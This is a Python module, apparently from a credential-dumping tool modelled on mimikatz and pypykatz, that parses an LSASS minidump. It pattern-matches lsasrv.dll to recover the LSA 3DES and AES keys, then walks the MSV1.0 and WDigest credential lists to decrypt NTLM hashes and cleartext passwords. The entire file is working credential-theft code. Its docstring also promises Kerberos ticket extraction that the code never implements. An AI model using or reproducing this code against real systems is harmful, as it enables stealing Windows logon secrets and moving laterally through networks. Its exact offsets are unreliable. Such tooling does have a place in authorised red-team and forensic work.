"""Credential extraction from a parsed LSASS minidump.

Walks the in-memory structures of lsass.exe to locate and decrypt:
- MSV1.0 (NTLM hashes)
- WDigest (cleartext passwords on older systems)
- Kerberos tickets

This is the most complex component — structure offsets vary by Windows build.
We support Windows 10 1809+ / Server 2019+ (modern builds).

The extraction follows the same logic as pypykatz/mimikatz:
1. Find lsasrv.dll in the dump
2. Locate the crypto keys (LsaInitializeProtectedMemory / LsaEncryptMemory)
3. Walk credential linked lists
4. Decrypt credentials using the recovered keys
"""

import struct
import hashlib
from dataclasses import dataclass

from .minidump import Minidump

try:
    from Crypto.Cipher import AES, DES3

    HAS_CRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES, DES3

        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False


@dataclass
class Credential:
    """Extracted credential."""

    username: str
    domain: str
    auth_type: str  # "msv1_0", "wdigest", "kerberos"
    ntlm_hash: str = ""
    sha1_hash: str = ""
    password: str = ""


@dataclass
class LsaKeys:
    """Decryption keys extracted from lsasrv.dll memory."""

    des_key: bytes = b""
    aes_key: bytes = b""
    iv: bytes = b""


class CredentialExtractor:
    """Extract credentials from a parsed LSASS minidump."""

    def __init__(self, dump: Minidump):
        self.dump = dump
        self._keys: LsaKeys | None = None
        self._build = dump.sysinfo_build

    def extract(self) -> list[Credential]:
        """Main extraction routine. Returns all found credentials."""
        credentials = []

        # Step 1: Find and extract LSA decryption keys
        self._keys = self._find_lsa_keys()
        if not self._keys:
            raise RuntimeError(
                "Could not find LSA decryption keys in dump. "
                "The dump may be incomplete or from an unsupported Windows version."
            )

        # Step 2: Extract MSV1.0 credentials (NTLM hashes)
        credentials.extend(self._extract_msv())

        # Step 3: Extract WDigest (cleartext on Win7/2012 or if UseLogonCredential=1)
        credentials.extend(self._extract_wdigest())

        return credentials

    def _find_lsa_keys(self) -> LsaKeys | None:
        """Locate the LSA encryption keys in lsasrv.dll memory.

        The keys are initialized by LsaInitializeProtectedMemory and stored
        in global variables within lsasrv.dll:
        - h3DesKey / hAesKey (BCRYPT_KEY_HANDLE structures)
        - InitializationVector

        We find them by pattern-matching known byte sequences near the key storage.
        """
        lsasrv = self.dump.find_module("lsasrv.dll")
        if not lsasrv:
            return None

        # Key patterns vary by Windows build
        # Windows 10 1809+ / Server 2019+ pattern for AES key reference
        # Pattern: signature bytes near the key initialization
        patterns = self._get_key_patterns()

        for pattern_info in patterns:
            results = self.dump.search_memory(pattern_info["pattern"])
            for addr in results:
                # Verify it's within lsasrv.dll
                if not (lsasrv.base_address <= addr < lsasrv.base_address + lsasrv.size):
                    continue

                keys = self._extract_keys_at(addr, pattern_info)
                if keys and (keys.aes_key or keys.des_key):
                    return keys

        return None

    def _get_key_patterns(self) -> list[dict]:
        """Get the byte patterns for finding keys based on OS build."""
        # These patterns are the byte signatures found near the key global variables
        # in lsasrv.dll. They change between major Windows versions.

        if self._build >= 19041:
            # Windows 10 2004+ / 11 / Server 2022
            return [
                {
                    "pattern": b"\x8b\xc0\x48\x8d\x05",
                    "iv_offset": -61,
                    "des_offset": -73,
                    "aes_offset": -90,
                    "key_struct_offset": 0x10,
                },
            ]
        elif self._build >= 17763:
            # Windows 10 1809 / Server 2019
            return [
                {
                    "pattern": b"\x83\x64\x24\x30\x00\x48\x8d\x45",
                    "iv_offset": 61,
                    "des_offset": -73,
                    "aes_offset": -90,
                    "key_struct_offset": 0x10,
                },
            ]
        else:
            # Older versions — generic pattern
            return [
                {
                    "pattern": b"\x83\x64\x24\x30\x00\x44\x8b\x4c\x24",
                    "iv_offset": 62,
                    "des_offset": -61,
                    "aes_offset": -78,
                    "key_struct_offset": 0x10,
                },
            ]

    def _extract_keys_at(self, addr: int, pattern_info: dict) -> LsaKeys | None:
        """Try to extract LSA keys given a pattern match address."""
        keys = LsaKeys()

        # Read IV (16 bytes)
        iv_ptr_offset = pattern_info["iv_offset"]
        iv_ref = self.dump.read_u32(addr + iv_ptr_offset)
        if iv_ref is None:
            return None

        # The reference is RIP-relative: actual_addr = addr + iv_ptr_offset + 4 + iv_ref
        iv_addr = addr + iv_ptr_offset + 4 + iv_ref
        iv_data = self.dump.read_memory(iv_addr, 16)
        if iv_data:
            keys.iv = iv_data

        # Read 3DES key handle pointer
        des_ptr_offset = pattern_info["des_offset"]
        des_ref = self.dump.read_u32(addr + des_ptr_offset)
        if des_ref:
            des_handle_addr = addr + des_ptr_offset + 4 + des_ref
            des_key = self._read_bcrypt_key(des_handle_addr, key_size=24)
            if des_key:
                keys.des_key = des_key

        # Read AES key handle pointer
        aes_ptr_offset = pattern_info["aes_offset"]
        aes_ref = self.dump.read_u32(addr + aes_ptr_offset)
        if aes_ref:
            aes_handle_addr = addr + aes_ptr_offset + 4 + aes_ref
            aes_key = self._read_bcrypt_key(aes_handle_addr, key_size=16)
            if aes_key:
                keys.aes_key = aes_key

        return keys

    def _read_bcrypt_key(self, handle_addr: int, key_size: int) -> bytes | None:
        """Read the actual key bytes from a BCRYPT_KEY_HANDLE structure."""
        # BCRYPT_KEY_HANDLE → pointer to BCRYPT_KEY structure
        key_struct_ptr = self.dump.read_ptr(handle_addr)
        if not key_struct_ptr:
            return None

        # The key data is at offset within the BCRYPT_KEY structure
        # This offset varies, but we can search for the KSSM/MSSK tag
        key_struct = self.dump.read_memory(key_struct_ptr, 256)
        if not key_struct:
            return None

        # Look for "KSSM" (MSSK reversed) or "RUUU" tag that precedes key data
        tag_offset = key_struct.find(b"KSSM")
        if tag_offset == -1:
            tag_offset = key_struct.find(b"MSSK")
        if tag_offset == -1:
            # Try another common pattern
            tag_offset = key_struct.find(b"\x00" * 4 + struct.pack("<I", key_size))
            if tag_offset != -1:
                tag_offset += 8
            else:
                return None
        else:
            # Key data starts after: tag(4) + type(4) + ... typically at +12 from tag
            tag_offset += 12

        key_data = key_struct[tag_offset : tag_offset + key_size]
        if len(key_data) == key_size and key_data != b"\x00" * key_size:
            return key_data

        return None

    def _lsa_decrypt(self, encrypted: bytes) -> bytes:
        """Decrypt LSA-encrypted data using the recovered keys."""
        if not HAS_CRYPTO:
            raise RuntimeError(
                "pycryptodome is required for credential decryption. "
                "Install with: pip install pycryptodome"
            )

        if not self._keys:
            return b""

        iv = self._keys.iv

        if len(encrypted) % 8 == 0 and len(encrypted) <= 24 and self._keys.des_key:
            # Use 3DES for small blocks
            cipher = DES3.new(self._keys.des_key, DES3.MODE_CBC, iv[:8])
            return cipher.decrypt(encrypted)
        elif self._keys.aes_key:
            # Use AES-CFB for larger blocks
            cipher = AES.new(self._keys.aes_key, AES.MODE_CFB, iv, segment_size=128)
            return cipher.decrypt(encrypted)

        return b""

    def _extract_msv(self) -> list[Credential]:
        """Extract MSV1.0 credentials (NTLMv1/v2 hashes).

        Walks the MSV1.0 credential list in msv1_0.dll memory.
        """
        credentials = []

        msv = self.dump.find_module("msv1_0")
        if not msv:
            return credentials

        # Find the credential list by searching for known patterns in msv1_0.dll
        # The list head pointer is near a specific signature
        pattern = self._get_msv_pattern()
        if not pattern:
            return credentials

        results = self.dump.search_memory(pattern)
        for addr in results:
            if not (msv.base_address <= addr < msv.base_address + msv.size):
                continue

            creds = self._walk_msv_list(addr)
            credentials.extend(creds)
            if creds:
                break  # Found the right list

        return credentials

    def _get_msv_pattern(self) -> bytes | None:
        """Get the pattern to find MSV credential list based on build."""
        if self._build >= 19041:
            return b"\x45\x89\x34\x24\x4c\x8b"
        elif self._build >= 17763:
            return b"\x48\x8b\x18\x48\x8d\x0d"
        return b"\x33\xff\x41\x89\x7c\x24"

    def _walk_msv_list(self, pattern_addr: int) -> list[Credential]:
        """Walk the MSV1.0 credential linked list from a pattern match."""
        credentials = []

        # The list head is referenced by a RIP-relative offset near the pattern
        # Read the offset (usually 6 bytes after pattern start)
        ref = self.dump.read_u32(pattern_addr + 6)
        if ref is None:
            return credentials

        list_head = pattern_addr + 6 + 4 + ref
        first_entry = self.dump.read_ptr(list_head)

        if not first_entry or first_entry == list_head:
            return credentials

        # Walk the list (max 256 entries to avoid infinite loops)
        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            cred = self._parse_msv_entry(current)
            if cred:
                credentials.append(cred)

            # Next entry (Flink is at offset 0)
            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _parse_msv_entry(self, addr: int) -> Credential | None:
        """Parse a single MSV1.0 credential entry.

        The structure layout depends on the Windows build.
        Key fields: username, domain, encrypted NT hash, encrypted LM hash.
        """
        # Offsets for modern Windows 10 builds (19041+)
        # These are offsets within the KIWI_MSV1_0_LIST structure
        if self._build >= 19041:
            username_offset = 0x90
            domain_offset = 0x80
            encrypted_nt_offset = 0xA8
        elif self._build >= 17763:
            username_offset = 0x90
            domain_offset = 0x80
            encrypted_nt_offset = 0xA8
        else:
            username_offset = 0x78
            domain_offset = 0x68
            encrypted_nt_offset = 0x90

        # Read UNICODE_STRING for username: Length(2) + MaxLength(2) + padding(4) + Buffer(8)
        username = self._read_unicode_string(addr + username_offset)
        domain = self._read_unicode_string(addr + domain_offset)

        if not username:
            return None

        # Read encrypted credentials sub-structure
        # The NT hash is 16 bytes, encrypted
        encrypted_nt = self.dump.read_memory(addr + encrypted_nt_offset, 16)
        if not encrypted_nt or encrypted_nt == b"\x00" * 16:
            return None

        # Decrypt
        nt_hash_raw = self._lsa_decrypt(encrypted_nt)
        nt_hash = nt_hash_raw[:16].hex() if nt_hash_raw else ""

        return Credential(
            username=username,
            domain=domain,
            auth_type="msv1_0",
            ntlm_hash=nt_hash,
        )

    def _extract_wdigest(self) -> list[Credential]:
        """Extract WDigest credentials (cleartext passwords).

        Only available if UseLogonCredential is enabled (default on Win7/2008,
        disabled by default on Win8.1+/2012R2+).
        """
        credentials = []

        wdigest = self.dump.find_module("wdigest")
        if not wdigest:
            return credentials

        # Search for the WDigest credential list pattern
        pattern = b"\x48\x3b\xd9\x74"
        results = self.dump.search_memory(pattern)

        for addr in results:
            if not (wdigest.base_address <= addr < wdigest.base_address + wdigest.size):
                continue

            creds = self._walk_wdigest_list(addr)
            credentials.extend(creds)
            if creds:
                break

        return credentials

    def _walk_wdigest_list(self, pattern_addr: int) -> list[Credential]:
        """Walk the WDigest credential linked list."""
        credentials = []

        # Find list head via RIP-relative reference
        ref = self.dump.read_u32(pattern_addr - 4)
        if ref is None:
            return credentials

        list_head = pattern_addr + ref
        first_entry = self.dump.read_ptr(list_head)

        if not first_entry or first_entry == list_head:
            return credentials

        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            # WDigest entry: Flink(8) + Blink(8) + UsageCount(4) + pad(4)
            # + Username UNICODE_STRING + Domain UNICODE_STRING + Password UNICODE_STRING
            username = self._read_unicode_string(current + 0x30)
            domain = self._read_unicode_string(current + 0x20)
            encrypted_pw = self._read_unicode_string_raw(current + 0x40)

            if username and encrypted_pw:
                decrypted = self._lsa_decrypt(encrypted_pw)
                password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")

                if password and password != username:
                    credentials.append(Credential(
                        username=username,
                        domain=domain,
                        auth_type="wdigest",
                        password=password,
                    ))

            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _read_unicode_string(self, addr: int) -> str:
        """Read a UNICODE_STRING structure and return the Python string."""
        length = self.dump.read_u16(addr)
        if not length or length > 512:
            return ""

        # Buffer pointer is at offset +8 (after Length(2) + MaxLength(2) + pad(4))
        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return ""

        data = self.dump.read_memory(buffer_ptr, length)
        if not data:
            return ""

        return data.decode("utf-16-le", errors="replace").rstrip("\x00")

    def _read_unicode_string_raw(self, addr: int) -> bytes:
        """Read the raw bytes of a UNICODE_STRING buffer."""
        length = self.dump.read_u16(addr)
        if not length or length > 1024:
            return b""

        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return b""

        data = self.dump.read_memory(buffer_ptr, length)
        return data if data else b""
